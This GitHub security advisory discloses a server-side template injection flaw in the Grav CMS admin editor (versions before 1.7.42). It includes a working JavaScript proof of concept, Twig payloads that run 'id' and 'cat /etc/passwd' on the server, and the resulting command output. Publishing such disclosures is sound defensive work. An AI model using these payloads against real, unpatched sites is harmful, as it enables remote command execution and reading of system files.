
Grav Server Side Template Injection (SSTI) vulnerability
Critical severity GitHub Reviewed Published Jun 14, 2023 in getgrav/grav • Updated Nov 5, 2023
Vulnerability details
Dependabot alerts 0
Package
getgrav/grav (
Composer
)
Affected versions
< 1.7.42
Patched versions
1.7.42
Description
Summary

I found an RCE(Remote Code Execution) by SSTI in the admin screen.
Details

Remote Code Execution is possible by embedding malicious PHP code on the administrator screen by a user with page editing privileges.
PoC

    Log in to the administrator screen and access the edit screen of the default page "Typography". (http://127.0.0.1:8000/admin/pages/typography)
    Open the browser's console screen and execute the following JavaScript code to confirm that an arbitrary command (id) is being executed.
```
(async () => {
  const nonce = document.querySelector("input[name=admin-nonce]").value;
  const id = document.querySelector("input[name=__unique_form_id__]").value;

  const payload = "{{['id']|map('system')|join}}"; // SSTI Payload

  const params = new URLSearchParams();
  params.append("task", "save");
  params.append("data[header][title]", "poc");
  params.append("data[content]", payload);
  params.append("data[folder]", "poc");
  params.append("data[route]", "");
  params.append("data[name]", "default");
  params.append("data[header][body_classes]", "");
  params.append("data[ordering]", 1);
  params.append("data[order]", "");
  params.append("toggleable_data[header][process]", "on");
  params.append("data[header][process][twig]", 1);
  params.append("data[header][order_by]", "");
  params.append("data[header][order_manual]", "");
  params.append("data[blueprint", "");
  params.append("data[lang]", "");
  params.append("_post_entries_save", "edit");
  params.append("__form-name__", "flex-pages");
  params.append("__unique_form_id__", id);
  params.append("admin-nonce", nonce);

  await fetch("http://127.0.0.1:8000/admin/pages/typography", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: params,
  });

  window.open("http://127.0.0.1:8000/admin/pages/poc/:preview");
})();
```

Execution Result

    Payload: {{['id']|map('system')|join}}

uid=501(<user_name>) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae) uid=501(<user_name>) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)

    Payload: {{['cat /etc/passwd']|map('system')|join}}

## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico _taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false _networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false _installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false _lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false _postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false _scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false _ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false _appstore:*:33:33:Mac App Store Service:/var/db/appstore:/usr/bin/false _mcxalr:*:54:54:MCX AppLaunch:/var/empty:/usr/bin/false _appleevents:*:55:55:AppleEvents Daemon:/var/empty:/usr/bin/false _geod:*:56:56:Geo Services Daemon:/var/db/geod:/usr/bin/false _devdocs:*:59:59:Developer Documentation:/var/empty:/usr/bin/false _sandbox:*:60:60:Seatbelt:/var/empty:/usr/bin/false _mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false _ard:*:67:67:Apple Remote Desktop:/var/empty:/usr/bin/false _www:*:70:70:World Wide Web Server:/Library/WebServer:/usr/bin/false _eppc:*:71:71:Apple Events User:/var/empty:/usr/bin/false _cvs:*:72:72:CVS Server:/var/empty:/usr/bin/false _svn:*:73:73:SVN Server:/var/empty:/usr/bin/false _mysql:*:74:74:MySQL Server:/var/empty:/usr/bin/false _sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false _qtss:*:76:76:QuickTime Streaming Server:/var/empty:/usr/bin/false _cyrus:*:77:6:Cyrus Administrator:/var/imap:/usr/bin/false _mailman:*:78:78:Mailman List Server:/var/empty:/usr/bin/false _appserver:*:79:79:Application Server:/var/empty:/usr/bin/false _clamav:*:82:82:ClamAV Daemon:/var/virusmails:/usr/bin/false _amavisd:*:83:83:AMaViS Daemon:/var/virusmails:/usr/bin/false _jabber:*:84:84:Jabber XMPP Server:/var/empty:/usr/bin/false _appowner:*:87:87:Application Owner:/var/empty:/usr/bin/false _windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false _spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false _tokend:*:91:91:Token Daemon:/var/empty:/usr/bin/false _securityagent:*:92:92:SecurityAgent:/var/db/securityagent:/usr/bin/false _calendar:*:93:93:Calendar:/var/empty:/usr/bin/false _teamsserver:*:94:94:TeamsServer:/var/teamsserver:/usr/bin/false _update_sharing:*:95:-2:Update Sharing:/var/empty:/usr/bin/false _installer:*:96:-2:Installer:/var/empty:/usr/bin/false _atsserver:*:97:97:ATS Server:/var/empty:/usr/bin/false _ftp:*:98:-2:FTP Daemon:/var/empty:/usr/bin/false _unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false _softwareupdate:*:200:200:Software Update Service:/var/db/softwareupdate:/usr/bin/false _coreaudiod:*:202:202:Core Audio Daemon:/var/empty:/usr/bin/false _screensaver:*:203:203:Screensaver:/var/empty:/usr/bin/false _locationd:*:205:205:Location Daemon:/var/db/locationd:/usr/bin/false _trustevaluationagent:*:208:208:Trust Evaluation Agent:/var/empty:/usr/bin/false _timezone:*:210:210:AutoTimeZoneDaemon:/var/empty:/usr/bin/false _lda:*:211:211:Local Delivery Agent:/var/empty:/usr/bin/false _cvmsroot:*:212:212:CVMS Root:/var/empty:/usr/bin/false _usbmuxd:*:213:213:iPhone OS Device Helper:/var/db/lockdown:/usr/bin/false _dovecot:*:214:6:Dovecot Administrator:/var/empty:/usr/bin/false _dpaudio:*:215:215:DP Audio:/var/empty:/usr/bin/false _postgres:*:216:216:PostgreSQL Server:/var/empty:/usr/bin/false _krbtgt:*:217:-2:Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _kadmin_admin:*:218:-2:Kerberos Admin Service:/var/empty:/usr/bin/false _kadmin_changepw:*:219:-2:Kerberos Change Password Service:/var/empty:/usr/bin/false _devicemgr:*:220:220:Device Management Server:/var/empty:/usr/bin/false _webauthserver:*:221:221:Web Auth Server:/var/empty:/usr/bin/false _netbios:*:222:222:NetBIOS:/var/empty:/usr/bin/false _warmd:*:224:224:Warm Daemon:/var/empty:/usr/bin/false _dovenull:*:227:227:Dovecot Authentication:/var/empty:/usr/bin/false _netstatistics:*:228:228:Network Statistics Daemon:/var/empty:/usr/bin/false _avbdeviced:*:229:-2:Ethernet AVB Device Daemon:/var/empty:/usr/bin/false _krb_krbtgt:*:230:-2:Open Directory Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _krb_kadmin:*:231:-2:Open Directory Kerberos Admin Service:/var/empty:/usr/bin/false _krb_changepw:*:232:-2:Open Directory Kerberos Change Password Service:/var/empty:/usr/bin/false _krb_kerberos:*:233:-2:Open Directory Kerberos:/var/empty:/usr/bin/false _krb_anonymous:*:234:-2:Open Directory Kerberos Anonymous:/var/empty:/usr/bin/false _assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false _coremediaiod:*:236:236:Core Media IO Daemon:/var/empty:/usr/bin/false _launchservicesd:*:239:239:_launchservicesd:/var/empty:/usr/bin/false _iconservices:*:240:240:IconServices:/var/empty:/usr/bin/false _distnote:*:241:241:DistNote:/var/empty:/usr/bin/false _nsurlsessiond:*:242:242:NSURLSession Daemon:/var/db/nsurlsessiond:/usr/bin/false _displaypolicyd:*:244:244:Display Policy Daemon:/var/empty:/usr/bin/false _astris:*:245:245:Astris Services:/var/db/astris:/usr/bin/false _krbfast:*:246:-2:Kerberos FAST Account:/var/empty:/usr/bin/false _gamecontrollerd:*:247:247:Game Controller Daemon:/var/empty:/usr/bin/false _mbsetupuser:*:248:248:Setup User:/var/setup:/bin/bash _ondemand:*:249:249:On Demand Resource Daemon:/var/db/ondemand:/usr/bin/false _xserverdocs:*:251:251:macOS Server Documents Service:/var/empty:/usr/bin/false _wwwproxy:*:252:252:WWW Proxy:/var/empty:/usr/bin/false _mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false _nearbyd:*:268:268:Proximity and Ranging Daemon:/var/db/nearbyd:/usr/bin/false _reportmemoryexception:*:269:269:ReportMemoryException:/var/db/reportmemoryexception:/usr/bin/false _driverkit:*:270:270:DriverKit:/var/empty:/usr/bin/false _diskimagesiod:*:271:271:DiskImages IO Daemon:/var/db/diskimagesiod:/usr/bin/false _logd:*:272:272:Log Daemon:/var/db/diagnostics:/usr/bin/false _appinstalld:*:273:273:App Install Daemon:/var/db/appinstalld:/usr/bin/false _installcoordinationd:*:274:274:Install Coordination Daemon:/var/db/installcoordinationd:/usr/bin/false _demod:*:275:275:Demo Daemon:/var/empty:/usr/bin/false _rmd:*:277:277:Remote Management Daemon:/var/db/rmd:/usr/bin/false _accessoryupdater:*:278:278:Accessory Update Daemon:/var/db/accessoryupdater:/usr/bin/false _knowledgegraphd:*:279:279:Knowledge Graph Daemon:/var/db/knowledgegraphd:/usr/bin/false _coreml:*:280:280:CoreML Services:/var/db/coreml:/usr/bin/false _sntpd:*:281:281:SNTP Server Daemon:/var/empty:/usr/bin/false _trustd:*:282:282:trustd:/var/empty:/usr/bin/false _mmaintenanced:*:283:283:mmaintenanced:/var/db/mmaintenanced:/usr/bin/false _darwindaemon:*:284:284:Darwin Daemon:/var/db/darwindaemon:/usr/bin/false _notification_proxy:*:285:285:Notification Proxy:/var/empty:/usr/bin/false _avphidbridge:*:288:288:Apple Virtual Platform HID Bridge:/var/empty:/usr/bin/false _biome:*:289:289:Biome:/var/db/biome:/usr/bin/false _backgroundassets:*:291:291:Background Assets Service:/var/empty:/usr/bin/false _oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false _oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false

PoC Video

    PoC Video

Impact

Remote Command Execution (RCE) is possible.
Occurrences

    https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174

References

    PortSwigger: Server-side template injection
    HackTricks: SSTI (Server Side Template Injection)

References

    GHSA-f9jf-4cp4-4fq5
    https://nvd.nist.gov/vuln/detail/CVE-2023-34251
    getgrav/grav@244758d
    getgrav/grav@71bbed1
    getgrav/grav@8c2c1cb
    getgrav/grav@9d01140
    https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174

